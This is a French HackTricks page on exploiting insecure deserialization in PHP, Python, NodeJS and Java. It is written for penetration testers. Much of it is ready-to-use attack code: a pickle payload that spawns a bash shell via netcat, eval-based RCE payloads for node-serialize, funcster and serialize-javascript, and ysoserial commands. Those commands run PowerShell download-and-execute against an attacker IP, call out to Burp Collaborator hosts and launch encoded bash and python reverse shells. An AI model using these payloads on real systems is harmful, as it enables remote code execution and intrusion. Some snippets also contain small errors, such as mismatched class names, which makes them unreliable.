# D√©s√©rialisation

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Informations de base

La **s√©rialisation** est comprise comme la m√©thode de conversion d'un objet dans un format pouvant √™tre pr√©serv√©, dans le but de stocker l'objet ou de le transmettre dans le cadre d'un processus de communication. Cette technique est couramment utilis√©e pour garantir que l'objet puisse √™tre recr√©√© ult√©rieurement, en conservant sa structure et son √©tat.

La **d√©s√©rialisation**, en revanche, est le processus qui contrecarre la s√©rialisation. Il consiste √† prendre des donn√©es structur√©es dans un format sp√©cifique et √† les reconstruire en un objet.

La d√©s√©rialisation peut √™tre dangereuse car elle permet potentiellement **aux attaquants de manipuler les donn√©es s√©rialis√©es pour ex√©cuter un code malveillant** ou provoquer un comportement inattendu dans l'application lors du processus de reconstruction de l'objet.

## PHP

En PHP, des m√©thodes magiques sp√©cifiques sont utilis√©es lors des processus de s√©rialisation et de d√©s√©rialisation :

* `__sleep` : Appel√©e lorsqu'un objet est s√©rialis√©. Cette m√©thode doit renvoyer un tableau contenant les noms de toutes les propri√©t√©s de l'objet qui doivent √™tre s√©rialis√©es. Elle est couramment utilis√©e pour valider les donn√©es en attente ou effectuer des t√¢ches de nettoyage similaires.
* `__wakeup` : Appel√©e lorsqu'un objet est d√©s√©rialis√©. Elle est utilis√©e pour r√©tablir les connexions √† la base de donn√©es qui auraient pu √™tre perdues lors de la s√©rialisation et effectuer d'autres t√¢ches de r√©initialisation.
* `__unserialize` : Cette m√©thode est appel√©e √† la place de `__wakeup` (si elle existe) lorsqu'un objet est d√©s√©rialis√©. Elle offre un plus grand contr√¥le sur le processus de d√©s√©rialisation par rapport √† `__wakeup`.
* `__destruct` : Cette m√©thode est appel√©e lorsqu'un objet est sur le point d'√™tre d√©truit ou lorsque le script se termine. Elle est g√©n√©ralement utilis√©e pour des t√¢ches de nettoyage, telles que la fermeture des gestionnaires de fichiers ou des connexions √† la base de donn√©es.
* `__toString` : Cette m√©thode permet √† un objet d'√™tre trait√© comme une cha√Æne de caract√®res. Elle peut √™tre utilis√©e pour lire un fichier ou d'autres t√¢ches bas√©es sur les appels de fonctions √† l'int√©rieur, fournissant ainsi une repr√©sentation textuelle de l'objet.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Si vous regardez les r√©sultats, vous pouvez voir que les fonctions **`__wakeup`** et **`__destruct`** sont appel√©es lorsque l'objet est d√©s√©rialis√©. Notez que dans plusieurs tutoriels, vous trouverez que la fonction **`__toString`** est appel√©e lors de la tentative d'impression d'un attribut, mais apparemment cela **n'arrive plus**.

{% hint style="warning" %}
La m√©thode **`__unserialize(array $data)`** est appel√©e **au lieu de `__wakeup()`** si elle est impl√©ment√©e dans la classe. Cela vous permet de d√©s√©rialiser l'objet en fournissant les donn√©es s√©rialis√©es sous forme de tableau. Vous pouvez utiliser cette m√©thode pour d√©s√©rialiser les propri√©t√©s et effectuer les t√¢ches n√©cessaires lors de la d√©s√©rialisation.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Vous pouvez lire un exemple **PHP expliqu√© ici** : [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ici [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ou ici [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Vous pourriez abuser de la fonctionnalit√© d'autoload PHP pour charger des fichiers php arbitraires et plus encore :

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### S√©rialisation des valeurs r√©f√©renc√©es

Si pour une raison quelconque vous souhaitez s√©rialiser une valeur comme une **r√©f√©rence √† une autre valeur s√©rialis√©e**, vous pouvez :
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial pour PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) peut vous aider √† g√©n√©rer des charges utiles pour abuser des d√©s√©rialisations PHP.\
Notez que dans plusieurs cas, vous **ne pourrez pas trouver de moyen d'abuser d'une d√©s√©rialisation dans le code source** de l'application mais vous pourriez √™tre en mesure d'**abuser du code des extensions PHP externes.**\
Donc, si possible, v√©rifiez le `phpinfo()` du serveur et **recherchez sur internet** (et m√™me sur les **gadgets** de **PHPGGC**) quelques gadgets possibles que vous pourriez exploiter.

### D√©s√©rialisation des m√©tadonn√©es phar://

Si vous avez trouv√© une LFI qui se contente de lire le fichier et de ne pas ex√©cuter le code PHP √† l'int√©rieur, par exemple en utilisant des fonctions telles que _**file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**_. Vous pouvez essayer d'abuser d'une **d√©s√©rialisation** se produisant lors de la **lecture** d'un **fichier** en utilisant le protocole **phar**.\
Pour plus d'informations, lisez le post suivant :

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Lorsque l'objet est d√©pickl√©, la fonction _\_\_reduce\_\__ sera ex√©cut√©e.\
Lorsqu'exploit√©, le serveur pourrait renvoyer une erreur.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Pour plus d'informations sur l'√©vasion des **prisons de pickle**, consultez :

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

La page suivante pr√©sente la technique pour **abuser d'une d√©s√©rialisation non s√©curis√©e dans les biblioth√®ques python yamls** et se termine par un outil qui peut √™tre utilis√© pour g√©n√©rer une charge utile de d√©s√©rialisation RCE pour **Pickle, PyYAML, jsonpickle et ruamel.yaml** :

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Pollution de classe (Pollution de prototype Python)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### Fonctions magiques JS

JS **n'a pas de fonctions "magiques"** comme PHP ou Python qui vont √™tre ex√©cut√©es juste pour cr√©er un objet. Mais il a certaines **fonctions** qui sont **fr√©quemment utilis√©es m√™me sans les appeler directement** telles que **`toString`**, **`valueOf`**, **`toJSON`**.\
En abusant d'une d√©s√©rialisation, vous pouvez **compromettre ces fonctions pour ex√©cuter un autre code** (potentiellement en abusant des pollutions de prototype) vous pourriez ex√©cuter du code arbitraire lorsqu'elles sont appel√©es.

Une autre **mani√®re "magique" d'appeler une fonction** sans l'appeler directement est en **compromettant un objet renvoy√© par une fonction asynchrone** (promesse). Parce que, si vous **transformez** cet **objet renvoy√©** en une autre **promesse** avec une **propri√©t√©** appel√©e **"then" de type fonction**, elle sera **ex√©cut√©e** juste parce qu'elle est renvoy√©e par une autre promesse. _Suivez_ [_**ce lien**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _pour plus d'informations._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### Pollution de `__proto__` et `prototype`

Si vous voulez en savoir plus sur cette technique, **consultez le tutoriel suivant**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Cette biblioth√®que permet de s√©rialiser des fonctions. Exemple:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
L'**objet s√©rialis√©** ressemblera √† :
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Vous pouvez voir dans l'exemple que lorsqu'une fonction est s√©rialis√©e, le drapeau `_$$ND_FUNC$$_` est ajout√© √† l'objet s√©rialis√©.

√Ä l'int√©rieur du fichier `node-serialize/lib/serialize.js`, vous pouvez trouver le m√™me drapeau et comment le code l'utilise.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Comme vous pouvez le voir dans le dernier morceau de code, **si le drapeau est trouv√©**, `eval` est utilis√© pour d√©s√©rialiser la fonction, donc en gros **l'entr√©e utilisateur est utilis√©e √† l'int√©rieur de la fonction `eval`**.

Cependant, **simplement s√©rialiser** une fonction **ne l'ex√©cutera pas** car il serait n√©cessaire qu'une partie du code appelle `y.rce` dans notre exemple et c'est tr√®s **improbable**.\
Quoi qu'il en soit, vous pourriez simplement **modifier l'objet s√©rialis√©** **en ajoutant des parenth√®ses** afin d'ex√©cuter automatiquement la fonction s√©rialis√©e lorsque l'objet est d√©s√©rialis√©.\
Dans le prochain morceau de code, **remarquez la derni√®re parenth√®se** et comment la fonction `unserialize` ex√©cutera automatiquement le code :
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Comme indiqu√© pr√©c√©demment, cette biblioth√®que r√©cup√©rera le code apr√®s `_$$ND_FUNC$$_` et l'**ex√©cutera** en utilisant `eval`. Par cons√©quent, pour **auto-ex√©cuter du code**, vous pouvez **supprimer la cr√©ation de la fonction** et la derni√®re parenth√®se et **simplement ex√©cuter un JS oneliner** comme dans l'exemple suivant:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Vous pouvez [**trouver ici**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **plus d'informations** sur la fa√ßon d'exploiter cette vuln√©rabilit√©.

### [funcster](https://www.npmjs.com/package/funcster)

Un aspect notable de **funcster** est l'inaccessibilit√© des **objets int√©gr√©s standard**; ils se trouvent en dehors de la port√©e accessible. Cette restriction emp√™che l'ex√©cution de code qui tente d'invoquer des m√©thodes sur des objets int√©gr√©s, entra√Ænant des exceptions telles que `"ReferenceError: console is not defined"` lorsque des commandes comme `console.log()` ou `require(something)` sont utilis√©es.

Malgr√© cette limitation, la restauration d'un acc√®s complet au contexte global, y compris √† tous les objets int√©gr√©s standard, est possible gr√¢ce √† une approche sp√©cifique. En exploitant directement le contexte global, il est possible de contourner cette restriction. Par exemple, l'acc√®s peut √™tre r√©tabli en utilisant l'extrait suivant:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Pour** [**plus d'informations, consultez cette source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Le package **serialize-javascript** est con√ßu exclusivement √† des fins de s√©rialisation, sans aucune capacit√© de d√©s√©rialisation int√©gr√©e. Les utilisateurs sont responsables de mettre en ≈ìuvre leur propre m√©thode de d√©s√©rialisation. Une utilisation directe de `eval` est sugg√©r√©e par l'exemple officiel pour d√©s√©rialiser des donn√©es s√©rialis√©es :
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Si cette fonction est utilis√©e pour d√©s√©rialiser des objets, vous pouvez **facilement l'exploiter** :
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Pour** [**plus d'informations, consultez cette source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Biblioth√®que Cryo

Sur les pages suivantes, vous trouverez des informations sur la mani√®re d'exploiter cette biblioth√®que pour ex√©cuter des commandes arbitraires :

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

En Java, **les rappels de d√©s√©rialisation sont ex√©cut√©s pendant le processus de d√©s√©rialisation**. Cette ex√©cution peut √™tre exploit√©e par des attaquants qui cr√©ent des charges malveillantes d√©clenchant ces rappels, entra√Ænant ainsi une ex√©cution potentielle d'actions nuisibles.

### Empreintes digitales

#### Bo√Æte Blanche

Pour identifier les vuln√©rabilit√©s potentielles de s√©rialisation dans le code source, recherchez :

* Les classes qui impl√©mentent l'interface `Serializable`.
* L'utilisation des fonctions `java.io.ObjectInputStream`, `readObject`, `readUnshare`.

Portez une attention particuli√®re √† :

* `XMLDecoder` utilis√© avec des param√®tres d√©finis par des utilisateurs externes.
* La m√©thode `fromXML` de `XStream`, en particulier si la version de XStream est inf√©rieure ou √©gale √† 1.46, car elle est sujette √† des probl√®mes de s√©rialisation.
* `ObjectInputStream` coupl√© √† la m√©thode `readObject`.
* L'impl√©mentation de m√©thodes telles que `readObject`, `readObjectNodData`, `readResolve` ou `readExternal`.
* `ObjectInputStream.readUnshared`.
* L'utilisation g√©n√©rale de `Serializable`.

#### Bo√Æte Noire

Pour les tests en bo√Æte noire, recherchez des **signatures ou "Magic Bytes"** sp√©cifiques indiquant des objets s√©rialis√©s Java (provenant de `ObjectInputStream`) :

* Motif hexad√©cimal : `AC ED 00 05`.
* Motif Base64 : `rO0`.
* En-t√™tes de r√©ponse HTTP avec `Content-type` d√©fini sur `application/x-java-serialized-object`.
* Motif hexad√©cimal indiquant une compression pr√©alable : `1F 8B 08 00`.
* Motif Base64 indiquant une compression pr√©alable : `H4sIA`.
* Fichiers Web avec l'extension `.faces` et le param√®tre `faces.ViewState`. D√©couvrir ces motifs dans une application Web devrait inciter √† un examen d√©taill√© comme d√©crit dans le [post sur la d√©s√©rialisation de Java JSF ViewState](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### V√©rifier si vuln√©rable

Si vous voulez **apprendre comment fonctionne une exploitation de d√©s√©rialisation Java**, vous devriez jeter un ≈ìil √† [**D√©s√©rialisation Java de base**](basic-java-deserialization-objectinputstream-readobject.md), [**D√©s√©rialisation Java DNS**](java-dns-deserialization-and-gadgetprobe.md), et [**Charge utile CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Test de la bo√Æte blanche

Vous pouvez v√©rifier s'il y a une application install√©e avec des vuln√©rabilit√©s connues.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Vous pourriez essayer de **v√©rifier toutes les biblioth√®ques** connues pour √™tre vuln√©rables et pour lesquelles [**Ysoserial**](https://github.com/frohoff/ysoserial) peut fournir une exploitation. Ou vous pourriez v√©rifier les biblioth√®ques indiqu√©es sur [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Vous pourriez √©galement utiliser [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) pour rechercher des cha√Ænes de gadgets possibles qui peuvent √™tre exploit√©es.\
Lors de l'ex√©cution de **gadgetinspector** (apr√®s l'avoir construit), ne vous souciez pas des tonnes d'avertissements/erreurs qu'il traverse et laissez-le terminer. Il √©crira toutes les d√©couvertes sous _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Veuillez noter que **gadgetinspector ne cr√©era pas d'exploit et il peut indiquer des faux positifs**.

#### Test de la bo√Æte noire

En utilisant l'extension Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md), vous pouvez identifier **quelles biblioth√®ques sont disponibles** (et m√™me les versions). Avec ces informations, il pourrait √™tre **plus facile de choisir une charge utile** pour exploiter la vuln√©rabilit√©.\
[**Lisez ceci pour en savoir plus sur GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe est ax√© sur les d√©s√©rialisations de **`ObjectInputStream`**.

En utilisant l'extension Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner), vous pouvez **identifier les biblioth√®ques vuln√©rables** exploitables avec ysoserial et les **exploiter**.\
[**Lisez ceci pour en savoir plus sur Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner est ax√© sur les d√©s√©rialisations de **`ObjectInputStream`**.

Vous pouvez √©galement utiliser [**Freddy**](https://github.com/nccgroup/freddy) pour **d√©tecter les vuln√©rabilit√©s de d√©s√©rialisation** dans **Burp**. Ce plugin d√©tectera les vuln√©rabilit√©s non seulement li√©es √† **`ObjectInputStream`** mais aussi aux vuln√©rabilit√©s des biblioth√®ques de d√©s√©rialisation **Json** et **Yml**. En mode actif, il essaiera de les confirmer en utilisant des charges utiles de sommeil ou de DNS.\
[**Vous pouvez trouver plus d'informations sur Freddy ici.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Test de s√©rialisation**

Tout ne consiste pas √† v√©rifier si une biblioth√®que vuln√©rable est utilis√©e par le serveur. Parfois, vous pourriez √™tre en mesure de **modifier les donn√©es √† l'int√©rieur de l'objet s√©rialis√© et contourner certaines v√©rifications** (peut-√™tre vous accorder des privil√®ges d'administrateur √† l'int√©rieur d'une application web).\
Si vous trouvez un objet s√©rialis√© Java envoy√© √† une application web, **vous pouvez utiliser** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **pour afficher dans un format plus lisible par l'homme l'objet de s√©rialisation qui est envoy√©**. Savoir quelles donn√©es vous envoyez faciliterait leur modification et le contournement de certaines v√©rifications.

### **Exploitation**

#### **ysoserial**

L'outil principal pour exploiter les d√©s√©rialisations Java est [**ysoserial**](https://github.com/frohoff/ysoserial) ([**t√©l√©chargez ici**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Vous pouvez √©galement envisager d'utiliser [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) qui vous permettra d'utiliser des commandes complexes (avec des tubes par exemple).\
Notez que cet outil est **ax√©** sur l'exploitation de **`ObjectInputStream`**.\
Je commencerais par utiliser la charge utile "URLDNS" **avant une charge utile RCE** pour tester si l'injection est possible. Quoi qu'il en soit, notez que peut-√™tre la charge utile "URLDNS" ne fonctionne pas mais une autre charge utile RCE oui.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Lors de la cr√©ation d'une charge utile pour **java.lang.Runtime.exec()**, vous **ne pouvez pas utiliser de caract√®res sp√©ciaux** tels que ">" ou "|" pour rediriger la sortie d'une ex√©cution, "$()" pour ex√©cuter des commandes ou m√™me **passer des arguments** √† une commande s√©par√©s par des **espaces** (vous pouvez faire `echo -n "hello world"` mais vous ne pouvez pas faire `python2 -c 'print "Hello world"'`). Pour encoder correctement la charge utile, vous pouvez [utiliser cette page web](http://www.jackson-t.ca/runtime-exec-payloads.html).

N'h√©sitez pas √† utiliser le script suivant pour cr√©er **toutes les charges utiles d'ex√©cution de code possibles** pour Windows et Linux, puis les tester sur la page web vuln√©rable :
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Vous pouvez **utiliser** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **avec ysoserial pour cr√©er plus d'exploits**. Plus d'informations sur cet outil dans les **diapositives de la pr√©sentation** o√π l'outil a √©t√© pr√©sent√© : [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)peut √™tre utilis√© pour g√©n√©rer des charges utiles pour exploiter diff√©rentes biblioth√®ques de s√©rialisation **Json** et **Yml** en Java.\
Pour compiler le projet, j'ai d√ª **ajouter** ces **d√©pendances** √† `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Installer maven**, et **compiler** le projet :
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

